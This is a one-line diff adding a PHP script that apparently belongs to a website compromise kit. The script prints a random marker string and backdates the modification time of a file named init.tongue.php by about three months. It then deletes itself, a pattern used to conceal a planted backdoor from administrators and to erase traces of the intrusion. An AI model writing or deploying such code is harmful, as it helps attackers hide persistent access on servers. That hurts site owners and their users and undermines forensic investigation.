@@ -1,0 +1,1 @@
+<?php echo "NzQCXmpDhY"; if (file_exists("./init.tongue.php")){ touch("./init.tongue.php",(time()-60*60*24*30*3)); } unlink(__FILE__); /*H2YyhRS0rHYU3v3R1TdP*/ ?>
